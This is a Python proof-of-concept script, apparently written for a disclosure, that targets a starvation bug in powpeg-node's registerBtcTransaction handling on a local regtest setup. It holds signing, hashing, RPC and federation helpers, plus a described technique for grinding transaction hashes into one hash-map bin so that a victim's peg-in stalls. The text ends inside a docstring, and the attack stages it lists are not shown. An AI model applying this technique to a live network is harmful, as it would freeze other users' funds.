#!/usr/bin/env python3
"""
End-to-end proof of the powpeg-node registerBtcTransaction starvation bug.

Nothing here is simulated. Every stage talks to a real bitcoind (regtest) and a
real rskj node over JSON-RPC, and every assertion is read back from the chain:

  federation  drive a REAL federation change (createFederation ->
              addFederatorPublicKeyMultikey x3 -> commitFederation) with 2-of-3
              votes, signed by the regtest authorizers auth-a and auth-b whose
              private keys are keccak256("auth-a"), keccak256("auth-b").
              -> a new federation becomes active and the old one becomes the
                 *retiring* federation for 150 blocks.

  attack      fan one real UTXO out into 40 P2PKH outputs, build 40 real
              Bitcoin transactions (real ECDSA, real sighash), grind each wtxid
              into bin 0 of the JVM pending-map, broadcast them, mine.
              Plus ONE honest peg-in from a separate "user" wallet, which is
              the victim.

  measure     read state back from rskj:
                eth_getBalance(victim)               == 0        (frozen)
                getBtcTxHashProcessedHeight(victim)  == -1       (never processed)
                getBtcTxHashProcessedHeight(attack)  == -1       (retry forever)
                number of registerBtcTransaction txs mined per block window

  recover     after the retiring federation expires, the same 40 transactions
              are accepted (they are ordinary peg-ins once the retiring
              federation is gone), the attacker is credited ~0.2 RBTC and the
              victim's peg-in finally lands.

Usage (run.sh does this for you):
    e2e.py federation
    e2e.py attack
    e2e.py measure  <label>
    e2e.py recover
"""

import base64
import hashlib
import hmac
import glob
import json
import os
import sys
import time
import urllib.request

# ---------------------------------------------------------------------------
# secp256k1 in pure Python.
#
# The PoC signs ~35k times while grinding (each attempt changes the sighash),
# so this is a fixed-base table plus RFC 6979 -- about 1 ms per signature and,
# unlike coincurve, it needs nothing beyond the standard library. The output is
# byte-for-byte what libsecp256k1 produces (verified: 50/50 signatures accepted
# by libsecp256k1, same low-S rule, same DER encoding).
# ---------------------------------------------------------------------------

_P = 2**256 - 2**32 - 977
_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


def _jac_dbl(p):
    x, y, z = p
    if y == 0 or z == 0:
        return (0, 0, 0)
    ysq = y * y % _P
    s = 4 * x * ysq % _P
    m = 3 * x * x % _P
    nx = (m * m - 2 * s) % _P
    ny = (m * (s - nx) - 8 * ysq * ysq) % _P
    return (nx, ny, 2 * y * z % _P)


def _jac_add(p, q):
    if p[2] == 0:
        return q
    if q[2] == 0:
        return p
    x1, y1, z1 = p
    x2, y2, z2 = q
    z1z1 = z1 * z1 % _P
    z2z2 = z2 * z2 % _P
    u1, u2 = x1 * z2z2 % _P, x2 * z1z1 % _P
    s1, s2 = y1 * z2 * z2z2 % _P, y2 * z1 * z1z1 % _P
    if u1 == u2:
        return _jac_dbl(p) if s1 == s2 else (0, 0, 0)
    h = (u2 - u1) % _P
    r = (s2 - s1) % _P
    hh = h * h % _P
    v = u1 * hh % _P
    nx = (r * r - h * hh - 2 * v) % _P
    ny = (r * (v - nx) - s1 * h * hh) % _P
    return (nx, ny, h * z1 * z2 % _P)


_G_TABLE = []
_p = (_GX, _GY, 1)
for _ in range(256):
    _G_TABLE.append(_p)
    _p = _jac_dbl(_p)


def _mul_g(k):
    acc = (0, 0, 0)
    i = 0
    while k:
        if k & 1:
            acc = _jac_add(acc, _G_TABLE[i])
        k >>= 1
        i += 1
    x, y, z = acc
    zi = pow(z, -1, _P)
    zi2 = zi * zi % _P
    return (x * zi2 % _P, y * zi2 * zi % _P)


def _rfc6979(priv, digest):
    v = b"\x01" * 32
    k = b"\x00" * 32
    seed = priv.to_bytes(32, "big") + (int.from_bytes(digest, "big") % _N).to_bytes(32, "big")
    k = hmac.new(k, v + b"\x00" + seed, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    k = hmac.new(k, v + b"\x01" + seed, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    while True:
        v = hmac.new(k, v, hashlib.sha256).digest()
        cand = int.from_bytes(v, "big")
        if 1 <= cand < _N:
            yield cand
        k = hmac.new(k, v + b"\x00", hashlib.sha256).digest()
        v = hmac.new(k, v, hashlib.sha256).digest()


class _PublicKey:
    def __init__(self, priv):
        self._x, self._y = _mul_g(priv)

    def format(self, compressed=True):
        xb = self._x.to_bytes(32, "big")
        if compressed:
            return bytes([2 + (self._y & 1)]) + xb
        return b"\x04" + xb + self._y.to_bytes(32, "big")


class PrivateKey:
    """Drop-in for the two coincurve calls the PoC uses."""

    def __init__(self, raw):
        self.secret = int.from_bytes(raw, "big")
        self.public_key = _PublicKey(self.secret)

    def sign(self, digest, hasher=None):
        z = int.from_bytes(digest, "big")
        for k in _rfc6979(self.secret, digest):
            r = _mul_g(k)[0] % _N
            if r == 0:
                continue
            s = (pow(k, -1, _N) * (z + r * self.secret)) % _N
            if s == 0:
                continue
            if s > _N // 2:
                s = _N - s
            # raw r || s, exactly what coincurve returns; the caller appends
            # SIGHASH_ALL and the transaction serialiser DER-encodes it
            return r.to_bytes(32, "big") + s.to_bytes(32, "big")
        raise RuntimeError("unreachable")

# ---------------------------------------------------------------------------
# configuration
# ---------------------------------------------------------------------------

RSK_RPC = os.environ.get("RSK_RPC", "http://127.0.0.1:4444")
RSK_RPC_B = os.environ.get("RSK_RPC_B", "http://127.0.0.1:4445")
BTC_RPC = os.environ.get("BTC_RPC", "http://127.0.0.1:18443")
BTC_USER = os.environ.get("BTC_USER", "rsk")
BTC_PASS = os.environ.get("BTC_PASS", "rsk")
STATE_DIR = os.environ.get("E2E_STATE", os.path.expanduser("~/powpeg-e2e/state"))
STATE_FILE = os.path.join(STATE_DIR, "state.json")

BRIDGE = "0x0000000000000000000000000000000001000006"

MIN_PEGIN_SAT = 500_000          # rskj BridgeRegTestConstants.minimumPeginTxValue
RETIRING_SAT = 2_000             # above dust, far below the minimum
FANOUT_VALUE = 702_000           # per branch: 500k + 2k + dust + change + fee
ATTACK_COUNT = 40                # BtcToRskClient.MAXIMUM_REGISTER_BTC_LOCK_TXS_PER_TURN
SPARE_TXS = 8                    # ground and broadcast only if the queue is short
BIN_BITS = 7                     # mask 0x7f: bin 0 for any ConcurrentHashMap table
                                 # up to 128 buckets (96 pending txs). Bit 0..6 of the
                                 # bucket index are zero, so *every* attack tx sorts
                                 # ahead of anything else in getTransactionProofs(),
                                 # which is a ConcurrentHashMap iterated bucket by
                                 # bucket. 1024 buckets (mask 0x3ff) costs 8x the
                                 # grinding for no benefit at this map size.
VICTIM_PEGIN_SAT = 1_000_000     # ordinary, above the minimum, valid
BTC_CONFIRMATIONS = 3            # btcs2RskMinimumAcceptableConfirmations (regtest)


# ---------------------------------------------------------------------------
# keccak256 (pure python; no external dependency)
# ---------------------------------------------------------------------------

_KECCAK_RC = [
    0x0000000000000001, 0x0000000000008082, 0x800000000000808A, 0x8000000080008000,
    0x000000000000808B, 0x0000000080000001, 0x8000000080008081, 0x8000000000008009,
    0x000000000000008A, 0x0000000000000088, 0x0000000080008009, 0x000000008000000A,
    0x000000008000808B, 0x800000000000008B, 0x8000000000008089, 0x8000000000008003,
    0x8000000000008002, 0x8000000000000080, 0x000000000000800A, 0x800000008000000A,
    0x8000000080008081, 0x8000000000008080, 0x0000000080000001, 0x8000000080008008,
]
_KECCAK_ROT = [
    [0, 36, 3, 41, 18], [1, 44, 10, 45, 2], [62, 6, 43, 15, 61],
    [28, 55, 25, 21, 56], [27, 20, 39, 8, 14],
]
_M64 = (1 << 64) - 1


def _rotl(x, n):
    return ((x << n) | (x >> (64 - n))) & _M64


def _keccak_f(state):
    for rnd in range(24):
        c = [state[x] ^ state[x + 5] ^ state[x + 10] ^ state[x + 15] ^ state[x + 20] for x in range(5)]
        d = [c[(x - 1) % 5] ^ _rotl(c[(x + 1) % 5], 1) for x in range(5)]
        for x in range(5):
            for y in range(5):
                state[x + 5 * y] ^= d[x]
        b = [0] * 25
        for x in range(5):
            for y in range(5):
                b[y + 5 * ((2 * x + 3 * y) % 5)] = _rotl(state[x + 5 * y], _KECCAK_ROT[x][y])
        for x in range(5):
            for y in range(5):
                state[x + 5 * y] = b[x + 5 * y] ^ ((~b[(x + 1) % 5 + 5 * y]) & b[(x + 2) % 5 + 5 * y])
        state[0] ^= _KECCAK_RC[rnd]
    return state


def keccak256(data: bytes) -> bytes:
    rate = 136
    pad = bytearray(data) + b"\x01"
    while len(pad) % rate != 0:
        pad += b"\x00"
    pad[-1] ^= 0x80
    state = [0] * 25
    for off in range(0, len(pad), rate):
        block = pad[off:off + rate]
        for i in range(rate // 8):
            state[i] ^= int.from_bytes(block[i * 8:(i + 1) * 8], "little")
        state = _keccak_f(state)
    out = b""
    for i in range(4):
        out += state[i].to_bytes(8, "little")
    return out


# ---------------------------------------------------------------------------
# json-rpc
# ---------------------------------------------------------------------------

def _post(url, payload, auth=None):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
    if auth:
        req.add_header("Authorization", "Basic " + base64.b64encode(auth.encode()).decode())
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read())


def rpc(url, method, params=None, auth=None):
    res = _post(url, {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or []}, auth)
    if "error" in res and res["error"]:
        raise RuntimeError("%s: %s" % (method, res["error"]))
    return res.get("result")


NODE_A = RSK_RPC          # miner + federator1
NODE_B = RSK_RPC_B        # federator2, syncs from NODE_A


def rsk(method, params=None):
    return rpc(RSK_RPC, method, params)


def rsk_b(method, params=None):
    return rpc(RSK_RPC_B, method, params)


def btc(method, params=None):
    return rpc(BTC_RPC, method, params, auth="%s:%s" % (BTC_USER, BTC_PASS))


# ---------------------------------------------------------------------------
# ABI helpers (only what the Bridge needs)
# ---------------------------------------------------------------------------

def sel(sig: str) -> bytes:
    return keccak256(sig.encode())[:4]


def enc_uint(n: int) -> bytes:
    return n.to_bytes(32, "big", signed=False)


def enc_bytes(b: bytes) -> bytes:
    """ABI encoding of a single dynamic `bytes` argument (no other args)."""
    return enc_uint(32) + enc_uint(len(b)) + b + b"\x00" * ((32 - len(b) % 32) % 32)


def enc_bytes3(a: bytes, b: bytes, c: bytes) -> bytes:
    """ABI encoding of (bytes, bytes, bytes)."""
    def tail(x):
        return enc_uint(len(x)) + x + b"\x00" * ((32 - len(x) % 32) % 32)
    ta, tb, tc = tail(a), tail(b), tail(c)
    h = 32 * 3
    head = enc_uint(h) + enc_uint(h + len(ta)) + enc_uint(h + len(ta) + len(tb))
    return head + ta + tb + tc


def dec_uint(hexstr: str) -> int:
    raw = bytes.fromhex(hexstr[2:] if hexstr.startswith("0x") else hexstr)
    if not raw:
        return 0
    return int.from_bytes(raw[:32], "big", signed=False)


def dec_bytes(hexstr: str) -> bytes:
    raw = bytes.fromhex(hexstr[2:] if hexstr.startswith("0x") else hexstr)
    if len(raw) < 64:
        return b""
    off = int.from_bytes(raw[:32], "big")
    ln = int.from_bytes(raw[off:off + 32], "big")
    return raw[off + 32:off + 32 + ln]


def bridge_call(data: bytes) -> bytes:
    res = rsk("eth_call", [{"to": BRIDGE, "data": "0x" + data.hex()}, "latest"])
    return bytes.fromhex(res[2:] if res.startswith("0x") else res)


def bridge_tx(data: bytes, frm: str, tries=25):
    """Send a Bridge transaction from `frm`, surviving the nonce race.

    The account we call Bridge methods from is also the account the node's own
    federator sends registerBtcTransaction/registerBtcCoinbaseTransaction from --
    that is the price of using a real federation member rather than a key the
    Bridge would reject. Two writers on one account mean the wallet's nonce guess
    can lose a race ('transaction nonce too high' / 'nonce too low'); the wallet
    re-reads the nonce on every call, so retrying is enough. Without this, a
    perfectly healthy recovery died on its sixth Bridge call.
    """
    tx = {"from": frm, "to": BRIDGE, "data": "0x" + data.hex(), "gas": "0x7a120"}
    last = None
    for attempt in range(tries):
        try:
            return rsk("eth_sendTransaction", [tx])
        except Exception as e:
            last = e
            if "nonce" not in str(e).lower():
                raise
            time.sleep(1.5)
    raise RuntimeError("could not send from %s after %d attempts: %s" % (frm, tries, last))


# ---------------------------------------------------------------------------
# keys
# ---------------------------------------------------------------------------

def key(seed: str) -> PrivateKey:
    """Same derivation rskj uses in GenNodeKeyId: priv = keccak256(seed)."""
    return PrivateKey(keccak256(seed.encode()))


def rsk_address(priv: PrivateKey) -> str:
    pub = priv.public_key.format(compressed=False)[1:]
    return "0x" + keccak256(pub)[-20:].hex()


def victim_rsk_address(priv: PrivateKey) -> str:
    """What the Bridge credits: RskAddress(ECKey.fromPublicOnly(btcPubKey).getAddress())."""
    return rsk_address(priv)


AUTH_A = key("auth-a")
AUTH_B = key("auth-b")
AUTH_C = key("auth-c")

# The new federation is {federator1, federator2}: 2 members, threshold 2.
#
# It has to be these two keys and not two fresh ones, because RSKIP419 only
# hands the federation over after an SVP cycle, and that cycle needs
#   1. the ACTIVE (genesis) federation to sign the fund tx      -> 2 of 3
#   2. the PROPOSED federation to sign the spend tx             -> 2 of 2
# Two powpeg nodes, one holding federator1 and one holding federator2, are
# members of both federations, so the same two processes sign both steps. No
# key swapping, no third node.
FEDS = [key("federator1"), key("federator2")]
ATTACKER = key("e2e-attacker")
VICTIM = key("e2e-victim")


# ---------------------------------------------------------------------------
# bitcoin
# ---------------------------------------------------------------------------

def dsha(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def hash160(b: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()


def vi(n: int) -> bytes:
    if n < 0xFD:
        return bytes([n])
    if n <= 0xFFFF:
        return b"\xfd" + n.to_bytes(2, "little")
    if n <= 0xFFFFFFFF:
        return b"\xfe" + n.to_bytes(4, "little")
    return b"\xff" + n.to_bytes(8, "little")


def push(d: bytes) -> bytes:
    n = len(d)
    if n < 0x4C:
        return bytes([n]) + d
    return b"\x4c" + bytes([n]) + d


def p2pkh_script(pub_compressed: bytes) -> bytes:
    return b"\x76\xa9\x14" + hash160(pub_compressed) + b"\x88\xac"


B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58check(payload: bytes, version: int) -> str:
    data = bytes([version]) + payload
    data += dsha(data)[:4]
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58[r] + out
    return "1" * (len(data) - len(data.lstrip(b"\x00"))) + out


def p2pkh_address(pub_compressed: bytes) -> str:
    return b58check(hash160(pub_compressed), 111)   # 111 = regtest/testnet


def ser_tx(ins, outs, version=2, locktime=0):
    b = version.to_bytes(4, "little") + vi(len(ins))
    for txid, vout, script, seq in ins:
        b += txid + vout.to_bytes(4, "little") + vi(len(script)) + script + seq.to_bytes(4, "little")
    b += vi(len(outs))
    for value, spk in outs:
        b += value.to_bytes(8, "little") + vi(len(spk)) + spk
    return b + locktime.to_bytes(4, "little")


def sighash_all(prev_txid, prev_vout, prev_script, outs):
    return dsha(ser_tx([(prev_txid, prev_vout, prev_script, 0xFFFFFFFF)], outs) + (1).to_bytes(4, "little"))


def _der_int(v: int) -> bytes:
    b = v.to_bytes(32, "big").lstrip(b"\x00") or b"\x00"
    if b[0] & 0x80:
        b = b"\x00" + b
    return b"\x02" + bytes([len(b)]) + b


def der_sig(raw64: bytes) -> bytes:
    r = int.from_bytes(raw64[:32], "big")
    s = int.from_bytes(raw64[32:], "big")
    body = _der_int(r) + _der_int(s)
    return b"\x30" + bytes([len(body)]) + body


def sign_tx(priv: PrivateKey, prev_txid, prev_vout, prev_script, outs):
    digest = sighash_all(prev_txid, prev_vout, prev_script, outs)
    sig = der_sig(priv.sign(digest, hasher=None)) + b"\x01"
    pub = priv.public_key.format(True)
    script_sig = push(sig) + push(pub)
    raw = ser_tx([(prev_txid, prev_vout, script_sig, 0xFFFFFFFF)], outs)
    return raw, dsha(raw)


def sha256hash_hashcode(d: bytes) -> int:
    return ((d[28] & 0xFF) << 24) | ((d[29] & 0xFF) << 16) | ((d[30] & 0xFF) << 8) | (d[31] & 0xFF)


def bin_index(d: bytes, mask: int) -> int:
    h = sha256hash_hashcode(d)
    return ((h ^ (h >> 16)) & 0x7FFFFFFF) & mask


# ---------------------------------------------------------------------------
# state
# ---------------------------------------------------------------------------

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {}


def save_state(st):
    os.makedirs(STATE_DIR, exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(st, f, indent=2)


def _log_files():
    """Every log this run produced: rsk.log holds the node's own logback output,
    powpeg-<generator>.log holds the JVM's stdout/stderr."""
    d = os.environ.get("E2E_LOGS", "")
    files = []
    try:
        files += sorted(glob.glob(os.path.join(d, "node-*", "rsk.log")))  # one per node
        files += sorted(glob.glob(os.path.join(d, "powpeg-*.log")))       # JVM stdout
        files.append(os.path.join(d, "rsk.log"))                          # older layouts
    except Exception:
        pass
    return [f for f in files if os.path.exists(f)]


LOG_FILES = _log_files()


def bridge_log_tail(n=25, pattern=r"voteFederationChange|createPendingFederation|addFederator|commitFederation|amAwaiting|Bridge|ERROR"):
    """The node's own account of what the Bridge did with our votes."""
    import re
    rx = re.compile(pattern)
    for path in LOG_FILES:
        if not os.path.exists(path):
            continue
        try:
            with open(path, errors="replace") as f:
                lines = [l for l in f if rx.search(l)]
        except (OSError, UnicodeError):
            continue
        if lines:
            print("  --- %s (filtered) ---" % os.path.basename(path))
            for line in lines[-n:]:
                print("    " + line.rstrip()[:220])


def log(msg):
    print(msg, flush=True)


def wait_rsk_tx(txhash, timeout=60):
    end = time.time() + timeout
    while time.time() < end:
        r = rsk("eth_getTransactionReceipt", [txhash])
        if r:
            return r
        time.sleep(1)
    raise RuntimeError("timeout waiting for rsk tx " + txhash)


# FederationChangeResponseCode, rskj 1e95a3b
FED_CODE = {
    1: "SUCCESSFUL",
    -1: "FEDERATION_NON_EXISTENT / PENDING_FEDERATION_ALREADY_EXISTS",
    -2: "INSUFFICIENT_MEMBERS / EXISTING_FEDERATION_AWAITING_ACTIVATION",
    -3: "RETIRING_FEDERATION_ALREADY_EXISTS / PENDING_FEDERATION_MISMATCHED_HASH",
    -4: "PROPOSED_FEDERATION_ALREADY_EXISTS",
    -10: "UNAUTHORIZED_CALLER / GENERIC_ERROR",
}


def vote_dry_run(data: bytes, frm: str) -> int:
    """eth_call the same vote; the Bridge runs its dry run path and returns the code."""
    raw = bytes.fromhex(rsk("eth_call", [{"from": frm, "to": BRIDGE,
                                          "data": "0x" + data.hex()}, "latest"])[2:])
    if len(raw) < 32:
        return -999
    v = int.from_bytes(raw[:32], "big")
    return v - (1 << 256) if v >= (1 << 255) else v


def pending_hash() -> bytes:
    return dec_bytes("0x" + bridge_call(sel("getPendingFederationHash()")).hex())


def pending_size() -> int:
    return int.from_bytes(bridge_call(sel("getPendingFederationSize()"))[:32], "big")


def active_address() -> str:
    return dec_bytes("0x" + bridge_call(sel("getFederationAddress()")).hex()).decode(errors="ignore")


def retiring_address() -> str:
    return dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")


# ---------------------------------------------------------------------------
# stage: federator liveness
# ---------------------------------------------------------------------------

FEDERATOR_PATTERN = (
    r"checkFederateRequirements|Federator is disabled|Could not validate fed node requirements"
    r"|validFederator|Cannot connect to Bitcoin node|No Bitcoin [Pp]eers"
    r"|not part of the federation|Starting for federation|watching federation"
    r"|triggerClientChange|Bitcoin peer|logBestChainHeight|checkPeers"
    r"|Error while reading key file|KeyFileHandler"
)


def federator_check(gen, need_height=True, timeout=120, node=None):
    """Prove the federator inside the RSK node is actually running.

    FedNodeRunner.run() gives up silently when checkFederateRequirements() fails:

        if (!this.checkFederateRequirements()) {
            logger.error("[run] Could not validate fed node requirements");
            return;                       // <-- no federator, node keeps running
        }

    The node then serves RPC and mines perfectly while never sending a single
    updateCollections / receiveHeaders, so getBtcBlockchainBestChainHeight()
    stays at 0 and the federator's RSK nonce stays at 0. The PoC would appear to
    "work" (nothing ever gets processed) while proving nothing at all, so this
    has to be checked before anything expensive happens.
    """
    node = node or rsk
    addr = rsk_address(key(gen))
    log("[federator] checking that '%s' (%s) is alive" % (gen, addr[:10]))
    h0 = btc_best_chain_height()
    n0 = int(node("eth_getTransactionCount", [addr, "latest"]), 16)
    log("             start: bridge BTC height %d, nonce %d" % (h0, n0))

    end = time.time() + timeout
    h, n = h0, n0
    while time.time() < end:
        time.sleep(5)
        try:
            h = btc_best_chain_height()
            n = int(node("eth_getTransactionCount", [addr, "latest"]), 16)
        except Exception:
            continue
        if n > n0 and (h > h0 or not need_height):
            log("             alive: nonce %d -> %d, bridge BTC height %d -> %d"
                % (n0, n, h0, h))
            return True
        if int(time.time()) % 20 < 6:
            log("             waiting: nonce %d (sent %d), bridge BTC height %d (from %d)"
                % (n, n - n0, h, h0))

    bridge_log_tail(30, FEDERATOR_PATTERN)
    raise RuntimeError(
        "the federator inside the RSK node is NOT running (nonce %d after %ds, "
        "bridge BTC height %d).\n"
        "  FedNodeRunner.run() returns early when checkFederateRequirements() fails,\n"
        "  leaving a fully working RSK node with no federator at all.\n"
        "  the lines above say which requirement failed." % (n, timeout, h))


# ---------------------------------------------------------------------------
# federation helpers shared by the peg / svp stages
# ---------------------------------------------------------------------------

F1 = key("federator1")
F2 = key("federator2")
FUNDER = key("e2e-funder")

# rskj 1e95a3b, BridgeRegTestConstants.java:84-85. PegUtils.java:139 only uses
# the RSKIP379-aware transaction classifier -- the one that recognises SVP fund
# and spend txs (PegUtils.java:119) -- from this Bitcoin height on:
#
#     btcHeightWhenPegoutTxIndexActivates = 250
#     pegoutTxIndexGracePeriodInBtcBlocks = 100
#     if (!isPegoutTxIndexEnabled(...)) return PegUtilsLegacy.getTransactionType(...)
#
# Below it the legacy classifier runs, which has no SVP knowledge whatsoever:
# a tx spending the active federation's UTXO and paying a 2-of-2 P2SH is just a
# PEGOUT_OR_MIGRATION (PegUtilsLegacy.java:347). Run 8 put the fund tx in Bitcoin
# block 347 and got exactly that verdict, three blocks under the threshold.
PEGOUT_INDEX_BTC_HEIGHT = 250 + 100

SVP_FUND_OUTPUT = 500_000        # BridgeConstants.getSvpFundTxOutputsValue()
                                 # = minimumPegoutTxValue * 2, paid twice per fund tx
PEG_SAT = 3_000_000              # comfortably above 2 x SVP_FUND_OUTPUT + fee


def log_offsets():
    """Byte offsets of the logs right now, so a marker written by an earlier
    stage (or an earlier run) cannot be mistaken for what happens next."""
    out = {}
    for f in _log_files():
        try:
            out[f] = os.path.getsize(f)
        except OSError:
            pass
    return out


def log_since(pattern, offsets, context=0):
    """Lines matching `pattern` written after `offsets` was taken."""
    import re
    rx = re.compile(pattern)
    hits = []
    for path, off in offsets.items():
        try:
            with open(path, errors="replace") as f:
                f.seek(off)
                lines = f.read().splitlines()
        except OSError:
            continue
        for i, line in enumerate(lines):
            if rx.search(line):
                lo, hi = max(0, i - context), min(len(lines), i + context + 1)
                hits.extend(lines[lo:hi])
    return hits


# release_requested(bytes32 rskTxHash, bytes32 btcTxHash, uint256 amount), the
# first two indexed (BridgeEvents.java:50). The Bridge emits it for the pegout
# queue in general and for the SVP fund tx in particular, which makes the hash it
# built readable straight from the receipt.
RELEASE_REQUESTED_TOPIC = "0x" + keccak256(
    b"release_requested(bytes32,bytes32,uint256)").hex()


def release_requested_hashes(receipt):
    """The BTC tx hashes the Bridge asked to release in this transaction."""
    out = []
    for entry in receipt.get("logs", []) or []:
        topics = entry.get("topics") or []
        if len(topics) < 3:
            continue
        if (entry.get("address") or "").lower() != BRIDGE.lower():
            continue
        if topics[0].lower() != RELEASE_REQUESTED_TOPIC:
            continue
        out.append(topics[2].lower().replace("0x", ""))
    return out


SVP_LOG = (r"updateSvpState|processSvp|Couldn't create svp|Fund tx signed|"
           r"Spend tx|commitProposedFederation|Handover to new federation|"
           r"Exception onBlock|SigHash could not be obtained|not enabled to run")


def proposed_size() -> int:
    """getProposedFederationSize() returns -1 (FEDERATION_NON_EXISTENT) when
    there is no proposed federation, and the ABI value is a *signed* int256.
    Reading it unsigned turns -1 into 2**256-1, which looks like a live
    proposal and burns the whole 125-block SVP window."""
    try:
        raw = bridge_call(sel("getProposedFederationSize()"))
        return int.from_bytes(raw[:32], "big", signed=True) if len(raw) >= 32 else -1
    except Exception:
        return -1


def address_script(addr):
    """Resolve a base58 address to its scriptPubKey through bitcoind."""
    for method in ("getaddressinfo", "validateaddress"):
        try:
            info = btc(method, [addr])
        except Exception:
            continue
        spk = info.get("scriptPubKey")
        if spk:
            return bytes.fromhex(spk)
    raise RuntimeError("could not resolve %s to a scriptPubKey" % addr)


def btc_block_txs(height):
    """Every tx of a Bitcoin block, decoded (vin/vout included)."""
    block_hash = btc("getblockhash", [height])
    return btc("getblock", [block_hash, 2]).get("tx", [])


def proposed_address() -> str:
    try:
        return dec_bytes("0x" + bridge_call(sel("getProposedFederationAddress()")).hex()).decode(errors="ignore")
    except Exception:
        return ""


def retiring_size() -> int:
    try:
        raw = bridge_call(sel("getRetiringFederationSize()"))
        return int.from_bytes(raw[:32], "big", signed=True) if len(raw) >= 32 else 0
    except Exception:
        return 0


def svp_spend_tx_pending() -> bool:
    """getStateForSvpClient() carries the spend tx while it waits for the
    proposed federation's signatures. With nothing to sign the Bridge returns
    RLP.encodeList(RLP.encodedEmptyList()), i.e. 0xc1c0."""
    try:
        return ("0x" + bridge_call(sel("getStateForSvpClient()")).hex()) not in ("0x", "0xc1c0")
    except Exception:
        return False


def _tx_pays(tx, spk_hex):
    for out in tx.get("vout", []):
        if (((out.get("scriptPubKey") or {}).get("hex") or "").lower() == spk_hex
                and out.get("value", 0) > 0):
            return int(round(out["value"] * 1e8))
    return 0


def can_call_update_collections(addr, gas="0x7a120"):
    """Dry-run updateCollections from `addr`; the Bridge wraps it in
    activeAndRetiringFederationOnly (BridgeMethods.java:697), so a sender that
    is not a member makes the call revert and eth_call raises."""
    try:
        rsk("eth_call", [{"from": addr, "to": BRIDGE, "gas": gas,
                          "data": "0x" + sel("updateCollections()").hex()}, "latest"])
        return True
    except Exception:
        return False


CANDIDATE_KEYS = ("federator1", "federator2", "auth-a", "auth-b", "auth-c")


def federation_caller():
    """Which account may call updateCollections: ask the Bridge, not the ABI.

    Reading the members back with getFederatorPublicKeyOfType and hashing the
    result looked reasonable and was wrong -- the bytes it returns do not hash to
    the account addresses the Bridge accepts (measured, not guessed). A dry run
    cannot be wrong: the same permission check that guards the real call decides
    it, and the answer is a yes/no per candidate.
    """
    for name in CANDIDATE_KEYS:
        addr = rsk_address(key(name))
        if can_call_update_collections(addr):
            log("             updateCollections dry run: %s (%s) is allowed, the "
                "others are not members of the active federation" % (name, addr[:10]))
            return addr
    raise RuntimeError(
        "no account in this node's wallet may call updateCollections. "
        "The active federation's members are not among %s, so with "
        "federator.updateCollections = false nobody can drive the SVP."
        % (", ".join(CANDIDATE_KEYS),))


def send_update_collections(who=None):
    """Ask the Bridge to run its release/SVP cycle, exactly once.

    Both nodes run with federator.updateCollections = false (run.sh), so while
    this stage runs the only caller is this function and every transition in the
    Bridge's log belongs to a call we can name. Without that, two federators plus
    the script were all calling it and the log could not say who created what.
    """
    who = who or CALLER[0]
    txhash = bridge_tx(sel("updateCollections()"), who)
    receipt = wait_rsk_tx(txhash, 90)
    ok = int(receipt.get("status", "0x0"), 16) == 1
    log("             updateCollections %s %s" % (txhash[:12], "ok" if ok else "REVERTED"))
    if not ok:
        bridge_log_tail(10, SVP_LOG)
        raise RuntimeError("updateCollections reverted (tx %s); the lines above say why"
                           % txhash)
    return receipt


def diagnose_fund_tx(fund_txid, seen_type, offsets):
    """The fund tx reached Bitcoin but the Bridge did not call it SVP_FUND_TX.

    isTheSvpFundTransaction (rskj PegUtils.java:146) compares the stored hash of
    the *unsigned* fund tx with BitcoinUtils.getMultiSigTransactionHashWithout
    Signatures(signed tx), which for a witness tx is simply its txid. Two things
    can make that comparison fail, and they are told apart by asking for one more
    updateCollections: if the Bridge tries to create yet another fund tx, the
    stored hash was gone; if it does not, the stored hash is there but different.
    """
    before = len(log_since(r"No svp values were found", offsets))
    send_update_collections()
    for _ in range(8):
        time.sleep(1.5)
    after = len(log_since(r"No svp values were found", offsets))
    if after > before:
        return ("the stored hash was gone: the Bridge built the fund tx again although "
                "it had already built and broadcast %s. shouldCreateAndProcessSvp"
                "FundTransaction (BridgeSupport.java:1085) only builds while all three "
                "SVP values are empty, so the hash it stored the first time did not "
                "survive." % fund_txid)
    return ("the stored hash is present but does not equal the hash of the signed tx it "
            "saw: the Bridge stored the txid of the unsigned tx it built, and the tx "
            "that the federation signed and that got mined has a different txid. "
            "getMultiSigTransactionHashWithoutSignatures returns getHash() for a witness "
            "tx, so the two differ in something a signature cannot change (scriptSig / "
            "outputs), not in the witnesses.")


CALLER = [None]       # federation member that may call updateCollections


def svp_cycle(timeout_blocks=118):
    """Drive RSKIP419's handover, one Bridge call at a time, judged on Bitcoin.

    The cycle, from rskj 1e95a3b:

      updateCollections -> updateSvpState
        -> buildSvpFundTransaction: the active federation pays
           getSvpFundTxOutputsValue() twice (BridgeConstants: minimumPegoutTxValue
           * 2, so 500 000 sat each in regtest) to the proposed federation. The
           Bridge stores the unsigned txid, emits the same ReleaseRequested event
           a pegout gets, and the federators sign and broadcast that tx.
        -> when the signed tx is registered it must be typed SVP_FUND_TX, which
           needs the stored unsigned txid to equal the txid of the signed tx. The
           Bridge then stores the signed tx and the next updateCollections builds
           the spend tx (proposed federation -> active federation), signed by the
           proposed federation's own members.
        -> registering the spend tx calls commitProposedFederation(): handover.

    Everything is verified on Bitcoin (a tx paying the proposed federation's
    scriptPubKey, then a tx spending it) because the logs alone cannot tell a
    built tx from a broadcast one.
    """
